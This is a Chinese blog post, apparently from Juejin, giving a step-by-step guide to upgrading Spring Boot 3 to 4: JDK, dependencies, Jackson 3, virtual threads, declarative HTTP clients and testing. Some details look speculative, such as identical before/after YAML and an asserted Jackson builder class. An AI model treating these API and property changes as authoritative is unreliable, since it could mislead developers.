                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>兄弟们，鹏磊今天来聊聊从 Spring Boot 3 升级到 4 这事儿；说实话，这升级过程比想象中要复杂点，但也没那么吓人，只要按步骤来，基本都能搞定。别慌，慢慢来就行。</p>
<h2 data-id="heading-0">一、升级前准备</h2>
<p>升级之前，咱得先搞清楚几个事儿；别一上来就改代码，那样容易出问题。这事儿急不得，得一步步来。</p>
<h3 data-id="heading-1">1. 检查当前环境</h3>
<p>首先，你得知道你现在用的是啥版本；打开 <code>pom.xml</code> 或者 <code>build.gradle</code>，看看 Spring Boot 版本号。如果是 3.x 系列的，那就可以开始升级了；如果是 2.x 或者更老的版本，建议先升级到 3.x，再考虑升级到 4。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 这是升级前的 pom.xml，看看你的版本是不是 3.x --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 这是你当前的版本，记下来 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>
</code></pre>
<h3 data-id="heading-2">2. JDK 版本要求</h3>
<p>这个最重要，Spring Boot 4 要求最低 JDK 17，推荐用 JDK 21；你要是还在用 JDK 8 或者 JDK 11，那对不起，得先升级 JDK。这事儿没商量，不升级 JDK 就别想用 Spring Boot 4。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查一下你的 JDK 版本</span>
java -version

<span class="hljs-comment"># 如果版本低于 17，得先升级 JDK</span>
<span class="hljs-comment"># 推荐用 JDK 21，性能好，虚拟线程支持也完整</span>
</code></pre>
<h3 data-id="heading-3">3. 备份代码</h3>
<p>升级之前，一定要备份代码；别嫌麻烦，万一出问题，还能回滚。用 Git 的话，先提交一下，或者创建一个新分支专门用来升级。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建升级分支</span>
git checkout -b upgrade-to-spring-boot-4

<span class="hljs-comment"># 提交当前代码</span>
git add .
git commit -m <span class="hljs-string">"准备升级到 Spring Boot 4"</span>
</code></pre>
<h2 data-id="heading-4">二、依赖升级</h2>
<h3 data-id="heading-5">1. 更新 Spring Boot 版本</h3>
<p>第一步，先把 Spring Boot 版本改成 4.0.0；Maven 和 Gradle 的配置不一样，咱分别说说。</p>
<p><strong>Maven 配置：</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 升级后的 pom.xml，版本改成 4.0.0 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 改成 4.0.0，这是最新版本 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>21<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span>  <span class="hljs-comment">&lt;!-- JDK 版本改成 21，推荐用这个 --&gt;</span>
    <span class="hljs-comment">&lt;!-- 或者用 17，最低要求 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>
</code></pre>
<p><strong>Gradle 配置：</strong></p>
<pre><code class="hljs language-groovy" lang="groovy">// build.gradle 配置
plugins {
    id 'org.springframework.boot' version '4.0.0'  // 版本改成 4.0.0
    id 'io.spring.dependency-management' version '1.1.4'
}

java {
    sourceCompatibility = '21'  // JDK 版本改成 21
    targetCompatibility = '21'
}
</code></pre>
<h3 data-id="heading-6">2. 添加属性迁移工具</h3>
<p>升级过程中，有些配置属性可能会被废弃或者改名；Spring Boot 提供了个工具叫 <code>spring-boot-properties-migrator</code>，能帮你检查这些废弃的属性。这玩意儿挺有用的，建议先加上。启动的时候会自动提示你哪些属性有问题。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Maven 配置，添加属性迁移工具 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-properties-migrator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>  <span class="hljs-comment">&lt;!-- runtime 作用域，只在运行时用 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-groovy" lang="groovy">// Gradle 配置
dependencies {
    runtimeOnly 'org.springframework.boot:spring-boot-properties-migrator'  // 添加这个依赖
}
</code></pre>
<p>启动应用的时候，这个工具会自动检查废弃的属性，并在日志里提示你；等升级完了，记得把这个依赖删掉，不需要了。</p>
<h3 data-id="heading-7">3. 检查第三方依赖兼容性</h3>
<p>Spring Boot 4 升级了 Spring Framework 到 7.0，很多第三方依赖可能还没适配；你得一个个检查，看看有没有兼容 Spring Boot 4 的版本。</p>
<p>常见的依赖需要检查的：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 数据库相关 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-comment">&lt;!-- MySQL 驱动，检查版本 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- Redis 相关 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-comment">&lt;!-- Redis，一般没问题 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 消息队列 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-comment">&lt;!-- RabbitMQ，检查版本 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>建议去各个依赖的官网看看，有没有发布兼容 Spring Boot 4 的版本；没有的话，可能得等一段时间，或者找替代方案。这事儿比较麻烦，但也没办法。</p>
<h2 data-id="heading-8">三、代码修改</h2>
<h3 data-id="heading-9">1. 废弃的 API 替换</h3>
<p>Spring Boot 4 废弃了一些 API，得替换掉；最常见的是 Jackson 2 相关的，Spring Boot 4 全面支持 Jackson 3 了，Jackson 2 的自动配置被标记为废弃。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 升级前，用的是 Jackson 2</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JacksonConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Jackson2ObjectMapperBuilder <span class="hljs-title function_">jackson2ObjectMapperBuilder</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 这个 API 在 Spring Boot 4 里被废弃了</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jackson2ObjectMapperBuilder</span>();
    }
}

<span class="hljs-comment">// 升级后，改用 Jackson 3</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JacksonConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> JacksonObjectMapperBuilder <span class="hljs-title function_">jacksonObjectMapperBuilder</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 改用 Jackson 3 的 API，名字变了，用法差不多</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JacksonObjectMapperBuilder</span>();
    }
}
</code></pre>
<h3 data-id="heading-10">2. 配置属性迁移</h3>
<p>有些配置属性改名了，或者被废弃了；启动应用的时候，<code>spring-boot-properties-migrator</code> 会在日志里提示你。常见的配置变化：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 升级前的配置</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/test</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>
    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>  <span class="hljs-comment"># 这个属性可能改名了</span>

<span class="hljs-comment"># 升级后，检查日志提示，可能需要改成：</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/test</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>
    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>  <span class="hljs-comment"># 或者改成新的属性名</span>
</code></pre>
<h3 data-id="heading-11">3. 虚拟线程配置</h3>
<p>Spring Boot 4 深度集成了虚拟线程，如果你用的是 JDK 21，可以启用虚拟线程；这玩意儿性能好，能支持百万级并发。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml 配置虚拟线程</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">threads:</span>
    <span class="hljs-attr">virtual:</span>
      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 启用虚拟线程，JDK 21 才支持</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 代码里使用虚拟线程执行器</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VirtualThreadConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Executor <span class="hljs-title function_">virtualThreadExecutor</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 创建虚拟线程执行器，底层用的是 Java 21 的虚拟线程</span>
        <span class="hljs-comment">// 这玩意儿比传统线程池强多了，性能提升不是一点半点</span>
        <span class="hljs-keyword">return</span> Executors.newVirtualThreadPerTaskExecutor();
    }
    
    <span class="hljs-comment">// 配置 WebMvc 使用虚拟线程</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> TomcatProtocolHandlerCustomizer&lt;?&gt; protocolHandlerVirtualThreadExecutorCustomizer() {
        <span class="hljs-comment">// 让 Tomcat 使用虚拟线程处理请求，性能提升明显</span>
        <span class="hljs-keyword">return</span> protocolHandler -&gt; {
            protocolHandler.setExecutor(Executors.newVirtualThreadPerTaskExecutor());
        };
    }
}
</code></pre>
<h3 data-id="heading-12">4. 声明式 HTTP 客户端</h3>
<p>Spring Framework 7.0 引入了声明式 HTTP 客户端，用起来比 RestTemplate 和 WebClient 简单多了；如果你之前用的是 RestTemplate，可以考虑迁移到声明式客户端。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 升级前，用的是 RestTemplate</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RestTemplate restTemplate;  <span class="hljs-comment">// 这个还能用，但推荐用新的</span>
    
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-comment">// 调用远程接口，代码比较繁琐</span>
        <span class="hljs-keyword">return</span> restTemplate.getForObject(<span class="hljs-string">"http://api.example.com/users/"</span> + id, User.class);
    }
}

<span class="hljs-comment">// 升级后，改用声明式 HTTP 客户端</span>
<span class="hljs-meta">@HttpExchange(url = "http://api.example.com")</span>  <span class="hljs-comment">// 定义基础 URL</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserClient</span> {
    
    <span class="hljs-meta">@GetExchange("/users/{id}")</span>  <span class="hljs-comment">// GET 请求，路径参数是 id</span>
    User <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span>;  <span class="hljs-comment">// 方法签名就是接口定义，不用写实现</span>
}

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserClient userClient;  <span class="hljs-comment">// 注入客户端，Spring 会自动生成代理</span>
    
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-comment">// 直接调用，代码简洁多了</span>
        <span class="hljs-keyword">return</span> userClient.getUser(id);
    }
}
</code></pre>
<h2 data-id="heading-13">四、测试和验证</h2>
<h3 data-id="heading-14">1. 编译检查</h3>
<p>升级完依赖和代码，先编译一下，看看有没有编译错误；有错误的话，一个个解决。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Maven 编译</span>
mvn clean compile

<span class="hljs-comment"># Gradle 编译</span>
./gradlew clean build
</code></pre>
<h3 data-id="heading-15">2. 启动应用</h3>
<p>编译通过后，启动应用，看看能不能正常启动；启动的时候，注意看日志，<code>spring-boot-properties-migrator</code> 会提示废弃的属性。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动应用，观察日志</span>
mvn spring-boot:run

<span class="hljs-comment"># 或者</span>
java -jar target/your-app.jar
</code></pre>
<h3 data-id="heading-16">3. 功能测试</h3>
<p>启动成功后，跑一下功能测试，看看有没有问题；特别是那些用了废弃 API 的地方，得重点测试。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 写个简单的测试，验证基本功能</span>
<span class="hljs-meta">@SpringBootTest</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoads</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 测试应用上下文能不能正常加载</span>
        <span class="hljs-comment">// 如果这个测试都过不了，说明配置有问题</span>
    }
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testUserService</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 测试业务功能，看看有没有问题</span>
        <span class="hljs-comment">// 重点测试那些改了代码的地方</span>
    }
}
</code></pre>
<h2 data-id="heading-17">五、常见问题处理</h2>
<h3 data-id="heading-18">1. 依赖冲突</h3>
<p>升级过程中，可能会遇到依赖冲突；Maven 和 Gradle 都有工具可以检查依赖冲突。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Maven 检查依赖树</span>
mvn dependency:tree

<span class="hljs-comment"># Gradle 检查依赖</span>
./gradlew dependencies
</code></pre>
<p>如果发现冲突，可以用 <code>exclusions</code> 排除冲突的依赖，或者升级到兼容的版本。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Maven 排除冲突依赖 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>some-library<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 排除这个依赖 --&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-19">2. 配置属性找不到</h3>
<p>有些配置属性可能被废弃了，但你的代码还在用；启动的时候，日志会提示你，按照提示改成新的属性名就行。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 如果日志提示某个属性被废弃了，比如：</span>
<span class="hljs-comment"># The property 'spring.datasource.driver-class-name' is deprecated</span>

<span class="hljs-comment"># 改成新的属性名，或者删除，如果不需要的话</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-comment"># driver-class-name: com.mysql.cj.jdbc.Driver  # 这个可能不需要了，自动检测</span>
</code></pre>
<h3 data-id="heading-20">3. 类找不到</h3>
<p>如果启动的时候报 <code>ClassNotFoundException</code>，可能是某个依赖没升级，或者版本不兼容；检查一下依赖版本，升级到兼容 Spring Boot 4 的版本。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 如果报错说某个类找不到，比如：</span>
<span class="hljs-comment">// java.lang.ClassNotFoundException: com.fasterxml.jackson.databind.ObjectMapper</span>

<span class="hljs-comment">// 可能是 Jackson 版本问题，Spring Boot 4 用的是 Jackson 3</span>
<span class="hljs-comment">// 检查一下依赖，确保用的是 Spring Boot 4 管理的版本</span>
</code></pre>
<h2 data-id="heading-21">六、升级流程图</h2>
<p>整个升级流程可以用下面这个图来理解：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[开始升级] --&gt; B[检查当前环境]
    B --&gt; C{JDK 版本 &gt;= 17?}
    C --&gt;|否| D[升级 JDK]
    C --&gt;|是| E[备份代码]
    D --&gt; E
    E --&gt; F[更新 Spring Boot 版本]
    F --&gt; G[添加属性迁移工具]
    G --&gt; H[检查第三方依赖]
    H --&gt; I[修改代码]
    I --&gt; J[编译检查]
    J --&gt; K{编译通过?}
    K --&gt;|否| L[修复编译错误]
    L --&gt; J
    K --&gt;|是| M[启动应用]
    M --&gt; N{启动成功?}
    N --&gt;|否| O[查看日志，修复问题]
    O --&gt; M
    N --&gt;|是| P[功能测试]
    P --&gt; Q{测试通过?}
    Q --&gt;|否| R[修复功能问题]
    R --&gt; P
    Q --&gt;|是| S[删除属性迁移工具]
    S --&gt; T[升级完成]
</code></pre>
<h2 data-id="heading-22">七、升级后的优化</h2>
<h3 data-id="heading-23">1. 启用虚拟线程</h3>
<p>如果你用的是 JDK 21，建议启用虚拟线程；这玩意儿性能好，能大幅提升并发性能。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 启用虚拟线程</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">threads:</span>
    <span class="hljs-attr">virtual:</span>
      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
</code></pre>
<h3 data-id="heading-24">2. 使用 GraalVM 原生镜像</h3>
<p>Spring Boot 4 对 GraalVM 原生镜像的支持更完善了；如果条件允许，可以尝试编译成原生镜像，启动速度快，内存占用也少。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 GraalVM 编译原生镜像</span>
mvn spring-boot:build-image

<span class="hljs-comment"># 或者用 Gradle</span>
./gradlew bootBuildImage
</code></pre>
<h3 data-id="heading-25">3. 使用分层 JAR</h3>
<p>Spring Boot 4 支持分层 JAR，可以把依赖层、资源层和业务层分开；这样构建 Docker 镜像的时候，只有业务层变化才需要重新构建，构建速度快不少。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Maven 配置分层 JAR --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">layers</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">enabled</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">enabled</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 启用分层 JAR --&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">layers</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
</code></pre>
<h2 data-id="heading-26">八、总结</h2>
<p>从 Spring Boot 3 升级到 4，主要就是这几个步骤：</p>
<ol>
<li><strong>检查环境</strong>：JDK 版本、当前 Spring Boot 版本</li>
<li><strong>备份代码</strong>：用 Git 创建分支，或者备份文件</li>
<li><strong>升级依赖</strong>：更新 Spring Boot 版本，检查第三方依赖</li>
<li><strong>修改代码</strong>：替换废弃的 API，迁移配置属性</li>
<li><strong>测试验证</strong>：编译、启动、功能测试</li>
<li><strong>优化配置</strong>：启用虚拟线程，使用原生镜像等</li>
</ol>
<p>升级这事儿得慢慢来，别着急；遇到问题就查文档，或者看看日志提示。升级完了，性能提升还是挺明显的，特别是虚拟线程和原生镜像这两个特性，值得一试。反正鹏磊觉得这升级还是挺值的。</p>
<p>好了，今天就聊到这；下一篇咱详细说说 JDK 17+ 最低要求与 Java 21 推荐配置，包括怎么选择 JDK 版本，以及各个版本的特性。兄弟们有啥问题可以在评论区留言，鹏磊看到会回复的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kuikly基础之音频播放与资源管理：青蛙叫声实现]]></title>    <link>https://juejin.cn/post/7575884229524930596</link>    <guid>https://juejin.cn/post/7575884229524930596</guid>    <pubDate>2025-11-24T03:28:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575884229524930596" data-draft-id="7575937594350370859" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kuikly基础之音频播放与资源管理：青蛙叫声实现"/> <meta itemprop="keywords" content="Android,iOS,HarmonyOS"/> <meta itemprop="datePublished" content="2025-11-24T03:28:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="在下历飞雨"/> <meta itemprop="url" content="https://juejin.cn/user/1559379316800"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" 